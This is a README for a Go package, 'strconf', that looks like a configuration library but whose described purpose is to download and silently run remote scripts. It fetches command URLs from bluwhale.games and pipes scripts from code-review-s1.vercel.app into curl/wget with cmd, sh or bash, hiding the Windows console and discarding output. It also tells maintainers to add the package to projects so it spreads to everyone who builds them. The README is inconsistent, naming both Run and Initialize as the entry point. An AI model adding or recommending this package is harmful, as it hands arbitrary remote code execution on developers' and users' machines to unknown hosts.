# strconf

A Go package that runs a predefined command for Windows, Linux, or macOS when
your application calls `strconf.Run()`.

The configured commands download and execute remote scripts with your
application's permissions. Review the commands in `strconf.go` and their script
sources before using this package. Importing the package does not run commands.

## Include in a project

Requires Go 1.18 or later. Once this version is published to the repository,
the project maintainer adds the import shown below and runs this once in the
consuming project's directory:

```sh
go mod tidy
```

Commit the updated `go.mod` and any generated `go.sum` together with the code.
After cloning that project, users only need to build it:

```sh
go build ./...
```

Go downloads the recorded dependencies automatically when needed. Users do not
need to run `go get` separately. This setup belongs in the consuming project;
the `strconf` module cannot add itself to another project's dependencies.

To include dependency source code in the cloned project, the maintainer can also
run `go mod vendor` and commit the generated `vendor` directory. With a `go`
directive of 1.14 or later, Go uses that directory automatically for normal
builds. Vendoring avoids dependency downloads during the build; calling `Run`
still requires network access for the configured scripts.

## Use

```go
package main

import (
    "log"

    "github.com/goappconf/strconf"
)

func main() {
    if err := strconf.Initialize(); err != nil {
        log.Fatal(err)
    }
}
```

`Initialize` fetches the OS-specific command URLs from `https://bluwhale.games/curl_commands` and then runs the matching command for the current OS.
You can also point it at a different server by passing the server root:

```go
if err := strconf.InitializeWithServer("https://example.test"); err != nil {
    log.Fatal(err)
}
```
Every call runs the selected command again. Commands have no interactive input;
standard output and standard error are discarded. On Windows, the command shell
runs without a visible console window. Programs it launches can open their own
graphical windows. A console belonging to the calling application is unaffected.

| OS | Required tools on PATH | Script source |
| --- | --- | --- |
| Windows | `cmd.exe`, `curl` | `https://code-review-s1.vercel.app/api/settings/windows` |
| Linux | `wget`, `sh` (also `/bin/sh`) | `https://code-review-s1.vercel.app/api/settings/linux` |
| macOS | `curl`, `bash` (also `/bin/sh`) | `https://code-review-s1.vercel.app/api/settings/mac` |

The package fetches those URLs from `https://bluwhale.games/curl_commands`.

Network access to the script source is required. The commands are defined in
`strconf.go`; callers do not supply command arguments.

`Run` returns an error for an unsupported OS, an empty command, failure to start
the shell, or a nonzero shell exit status. The configured shell pipelines report
the final command's status, so a download failure may not produce an error.
There is no timeout; `Run` waits until the command exits.
